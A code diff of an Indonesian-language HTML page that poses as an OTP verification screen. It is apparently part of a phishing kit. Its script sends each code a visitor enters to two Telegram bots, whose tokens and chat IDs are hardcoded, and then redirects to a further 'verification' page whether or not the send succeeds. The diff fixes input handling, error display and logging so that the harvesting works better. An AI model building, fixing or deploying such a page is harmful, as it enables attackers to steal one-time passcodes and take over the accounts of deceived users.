@@ -31,7 +31,8 @@
             padding: 25px;
             border-radius: 8px;
             text-align: center;
-            margin-bottom: 50px;
+            margin-bottom: 30px;
+            
         }
 
         .title {
@@ -49,15 +50,16 @@
             font-size: 1rem;
             margin-bottom: 10px;
             outline: none;
-        }
+         }
 
         .info-text {
             font-size: 0.8rem;
             color: #666;
             margin-bottom: 5px;
-        }
-
+         }
+    
         /* === STYLE PESAN SALAH === */
+        
         .error-text {
             font-size: 0.8rem;
             color: #ff0000;
@@ -67,12 +69,12 @@
             justify-content: center;
             gap: 5px;
         }
-        /* ======================== */
 
         .timer-text {
-            font-size: 0.9rem;
+            font-size: 1rem;
             font-weight: bold;
-            margin-bottom: 10px;
+            margin-bottom: 20px;
+            color: #ff0050;
         }
 
         .resend-link {
@@ -81,6 +83,7 @@
             text-decoration: underline;
             margin-bottom: 25px;
             display: inline-block;
+            cursor: pointer;
         }
 
         .submit-btn {
@@ -95,11 +98,18 @@
             cursor: pointer;
         }
 
+        .submit-btn:disabled {
+            background-color: #ff88a0;
+            cursor: not-allowed;
+        }
+
         .footer-text {
             color: white;
             font-size: 0.8rem;
             text-align: center;
-            max-width: 600px;
+            max-width: 400px;
+            line-height: 1.5;
+            opacity: 0.8;
         }
     </style>
 </head>
@@ -108,24 +118,24 @@
     <div class="container-box">
         <div class="title">Masukkan kode verifikasi</div>
 
-        <input type="Number" id="kode" class="input-box" placeholder="Masukkan kode disini">
+        <!-- ✅ Diubah dari type="Number" jadi type="text" agar bisa diketik di HP -->
+        <input type="text" id="kode" class="input-box" placeholder="Masukkan kode OTP disini" inputmode="numeric" maxlength="6">
 
         <div class="info-text">
-            Kode OTP di kirim via SMS/WhatsApp/Email.<br>
+            Kode OTP dikirim via SMS/WhatsApp/Email.<br>
             OTP akan kedaluwarsa setelah 3 menit.
         </div>
 
-        <!-- === TULISAN KODE SALAH === -->
-        <div class="error-text">
+         <!-- ✅ Ditambahkan id="pesanError" agar script bisa menemukannya -->
+        <div class="error-text" id="pesanError">
             <i class="fas fa-exclamation-triangle"></i> Kode salah, Masukkan lagi.
         </div>
-        <!-- ========================= -->
-
+        
         <div class="timer-text" id="timer">02:51</div>
 
-        <a href="verifikasi kode.html" class="resend-link">Kirim ulang kode</a>
+        <a class="resend-link" id="kirimUlang">Kirim ulang kode</a>
 
-        <button class="submit-btn" onclick="kirimData()">MASUK</button>
+        <button class="submit-btn" id="btnKirim" onclick="kirimData()">MASUK</button>
     </div>
 
     <div class="footer-text">
@@ -133,23 +143,24 @@
         dan notifikasi pesan instan lainnya.
     </div>
 
-        <!-- ============================================== -->
-    <!-- SCRIPT KIRIM KE 2 BOT TELEGRAM & PINDAH HALAMAN -->
     <!-- ============================================== -->
-    <script>
-        // ==================== BOT 1 ====================
-        const BOT1_TOKEN = "8463412359:AAG6nli8rzC54LQSKkgXBXkwI8ePspNfFIA"; 
-        const BOT1_CHAT_ID = "-1003797236002";
+    <!-- SCRIPT SUDAH DIPERBAIKI — KIRIM & PINDAH HALAMAN -->
+    <!-- ============================================== -->
+        <script>
+        // ==================== ⚠️ WAJIB DIISI LENGKAP! ====================
+        // BOT 1 — Pastikan Token & Chat ID LENGKAP!
+        const BOT1_TOKEN = "8463412359:AAG6nli8rzC54LQSKkgXBXkwI8ePspNfFI1A"; // Ganti dengan Token lengkap Bot 1
+        const BOT1_CHAT_ID = "-1003797236002"; // Ganti dengan Chat ID lengkap Bot 1
 
-        // ==================== BOT 2 — GANTI DENGAN DATA BOT KEDUA ====================
-        const BOT2_TOKEN = "8567366336:AAEBjptgS76AUDZ80k1C0uLL5NQnTGnQT0Q"; 
+        // BOT 2
+        const BOT2_TOKEN = "8567366336:AAEBjptgS76AUDZ80k1C0uLL5NQnTGnQT0Q";
         const BOT2_CHAT_ID = "-1003710620091";
 
-        // ==================== HALAMAN TUJUAN ====================
+        // Halaman tujuan
         const HALAMAN_BERIKUTNYA = "verifikasi ulang.html";
 
         // === TIMER HITUNG MUNDUR ===
-        let totalDetik = 2 * 60 + 51; // 2 menit 51 detik
+        let totalDetik = 2 * 60 + 51;
         const timerElement = document.getElementById('timer');
         let timerExpired = false;
         
@@ -182,9 +193,10 @@
                     })
                 });
                 const data = await res.json();
+                console.log("Respon Bot:", data);
                 return data.ok;
             } catch (err) {
-                console.log("Gagal kirim:", err);
+                console.log("❌ Gagal kirim ke Bot:", err);
                 return false;
             }
         }
@@ -195,37 +207,39 @@
             let btn = document.getElementById("btnKirim");
             let error = document.getElementById("pesanError");
 
-            // Validasi
+            // Validasi minimal 4 digit
             if(kode === "" || kode.length < 4){
                 error.style.display = "block";
                 return false;
             }
             error.style.display = "none";
 
-            // Kunci tombol
+            // Kunci tombol saat proses
             btn.disabled = true;
             btn.innerText = "Memproses...";
 
             // Format pesan
-            let pesan = `<b>🔐 Kode Verifikasi / OTP</b>
-Kode: <code>${kode}</code>
-Waktu: ${new Date().toLocaleString('id-ID')}
+            let pesan = `<b>🔐 Kode OTP</b>
+Kode : <code>${kode}</code>
 ${timerExpired ? '⚠️ Waktu sudah habis!' : ''}`;
 
-            // Kirim ke 2 bot SECARA BERSAMAAN
+            console.log("📤 Mengirim data ke 2 bot...");
+
+            // Kirim ke 2 bot bersamaan
             const [hasilBot1, hasilBot2] = await Promise.all([
                 kirimKeBot(BOT1_TOKEN, BOT1_CHAT_ID, pesan),
                 kirimKeBot(BOT2_TOKEN, BOT2_CHAT_ID, pesan)
             ]);
 
-            console.log("Bot 1:", hasilBot1 ? "✅ Berhasil" : "❌ Gagal");
-            console.log("Bot 2:", hasilBot2 ? "✅ Berhasil" : "❌ Gagal");
+            console.log("🤖 Bot 1:", hasilBot1 ? "✅ Berhasil" : "❌ Gagal");
+            console.log("🤖 Bot 2:", hasilBot2 ? "✅ Berhasil" : "❌ Gagal");
 
-            // Pindah halaman
+            // Selalu pindah halaman — meskipun bot gagal
+            console.log("➡️ Pindah ke halaman:", HALAMAN_BERIKUTNYA);
             window.location.href = HALAMAN_BERIKUTNYA;
         }
 
-        // Kirim ulang kode — reset input & timer
+        // Kirim ulang kode
         document.getElementById('kirimUlang').addEventListener('click', () => {
             alert('Kode baru telah dikirim!');
             document.getElementById('kode').value = '';
@@ -248,3 +262,4 @@ ${timerExpired ? '⚠️ Waktu sudah habis!' : ''}`;
 </body>
 </html>
 
+        
